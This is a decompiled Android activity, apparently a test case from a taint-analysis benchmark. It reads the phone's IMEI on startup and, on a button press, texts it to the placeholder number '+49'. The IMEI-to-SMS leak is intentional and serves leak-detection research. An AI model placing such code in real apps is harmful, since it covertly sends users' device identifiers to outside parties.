// 
// Decompiled by Procyon v1.0-SNAPSHOT
// 

package de.ecspride;

import android.app.PendingIntent;
import android.telephony.SmsManager;
import android.content.Context;
import android.widget.Toast;
import android.view.View;
import android.telephony.TelephonyManager;
import android.os.Bundle;
import android.app.Activity;

public class Button1 extends Activity
{
    private static String imei;
    
    static {
        Button1.imei = null;
    }
    
    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        this.setContentView(2130903040);
        Button1.imei = ((TelephonyManager)this.getSystemService("phone")).getDeviceId();
    }
    
    public void sendMessage(final View view) {
        Toast.makeText((Context)this, (CharSequence)Button1.imei, 1).show();
        SmsManager.getDefault().sendTextMessage("+49", (String)null, Button1.imei, (PendingIntent)null, (PendingIntent)null);
    }
}
